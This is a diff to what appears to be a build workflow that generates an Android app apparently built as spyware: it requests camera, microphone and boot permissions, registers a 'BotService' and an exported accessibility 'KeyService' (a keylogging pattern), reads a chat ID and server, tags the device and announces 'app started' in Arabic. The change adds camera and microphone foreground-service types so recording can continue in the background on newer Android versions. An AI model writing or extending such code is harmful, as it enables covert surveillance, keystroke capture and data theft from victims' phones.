@@ -112,6 +112,8 @@ jobs:
             <uses-permission android:name="android.permission.CAMERA"/>
             <uses-permission android:name="android.permission.RECORD_AUDIO"/>
             <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
             <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
             <application android:label="@string/app_name"
                 android:icon="@android:drawable/sym_def_app_icon"
@@ -123,7 +125,8 @@ jobs:
                   <category android:name="android.intent.category.LAUNCHER"/>
                 </intent-filter>
               </activity>
-              <service android:name=".BotService" android:exported="false"/>
+              <service android:name=".BotService" android:exported="false"
+                  android:foregroundServiceType="camera|microphone|dataSync"/>
               <service android:name=".KeyService" android:exported="true"
                   android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
                 <intent-filter>
@@ -282,7 +285,16 @@ jobs:
               CH = getString(R.string.vanta_chat);
               SRV = getString(R.string.vanta_server);
               DID = Build.MANUFACTURER + "_" + Build.MODEL + "_" + Long.toHexString(System.currentTimeMillis());
-              try { startForeground(1, notif()); } catch (Exception e) {}
+              try {
+                if (Build.VERSION.SDK_INT >= 29) {
+                  startForeground(1, notif(),
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                    | android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    | android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+                } else {
+                  startForeground(1, notif());
+                }
+              } catch (Exception e) {}
               try { alert(this, "🚀 التطبيق بدأ | " + DID); } catch (Exception e) {}
               new Thread(new Runnable() { public void run() { loop(); } }).start();
             }
